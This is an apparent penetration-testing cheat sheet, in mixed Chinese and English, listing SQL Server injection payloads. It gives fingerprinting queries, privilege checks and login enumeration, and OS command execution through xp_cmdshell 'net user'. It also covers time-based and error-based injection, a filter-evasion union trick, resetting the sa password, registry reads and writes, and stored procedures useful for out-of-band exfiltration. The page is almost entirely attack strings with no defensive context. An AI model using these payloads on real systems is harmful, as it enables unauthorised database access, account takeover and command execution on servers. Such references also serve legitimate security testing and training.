SQL Server Payload
========================================

常见Payload
----------------------------------------
- Version
    - ``SELECT @@version``
    - ``SELECT SERVERPROPERTY('Edition');``
    - ``SELECT SERVERPROPERTY('EngineEdition');``
- Comment 
    - ``SELECT 1 -- comment``
    - ``SELECT /*comment*/1``
- Space
    - ``0x01 - 0x20``
- 用户信息
    - ``SELECT user_name()``
    - ``SELECT system_user``
    - ``SELECT user``
    - ``SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID``
- 用户权限
    - ``select IS_SRVROLEMEMBER('sysadmin')``
    - ``select IS_SRVROLEMEMBER('db_owner')``
- List User
    - ``SELECT name FROM master..syslogins``
- 数据库信息
    - ``SELECT name FROM master..sysdatabases``
    - ``select concat_ws(table_schema,table_name,column_name) from information_schema.columns``
    - ``select quotename(name) from master..sysdatabases FOR XML PATH('')``
- 执行命令
    - ``EXEC xp_cmdshell 'net user'``
- Ascii
    - ``SELECT char(0x41)``
    - ``SELECT ascii('A')``
    - ``SELECT char(65)+char(66)`` => return ``AB``
- Delay
    - ``WAITFOR DELAY '0:0:3'`` pause for 3 seconds
- Change Password
    - ``ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'``
- Trick
    - ``id=1 union:select password from:user``
- 文件读取
    - OpenRowset
- 当前查询语句
    - ``select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)``
- hostname
    - 用于判断是否站库分离
    - ``select host_name()``
    - ``exec xp_getnetname``
- 服务器信息
    - ``exec xp_msver``
- 系统配置
    - ``select * from sys.configurations;``

注册表读写
----------------------------------------
- ``xp_regread``
    - ``exec xp_regread N'HKEY_LOCAL_MACHINE', N'SYSTEM\CurrentControlSet\Services\MSSEARCH'``
- ``xp_regwrite``
- ``xp_regdeletvalue``
- ``xp_regdeletkey``
- ``xp_regaddmultistring``

报错注入
----------------------------------------
- ``1=convert(int,(db_name()))``

常用函数
----------------------------------------
- SUSER_NAME()
- USER_NAME()
- PERMISSIONS()
- DB_NAME()
- FILE_NAME()
- TYPE_NAME()
- COL_NAME()

DNS OOB
----------------------------------------
- fn_xe_file_target_read_file
- fn_get_audit_file
- fn_trace_gettable

其他常用存储过程
----------------------------------------
- sp_execute_external_script
- sp_makewebtask
- sp_OACreate
- sp_OADestroy
- sp_OAGetErrorInfo
- sp_OAGetProperty
- sp_OAMethod
- sp_OASetProperty
- sp_OAStop
- xp_cmdshell
- xp_dirtree
- xp_enumerrorlogs
- xp_enumgroups
- xp_fixeddrives
- xp_getfiledetails
- xp_loginconfig
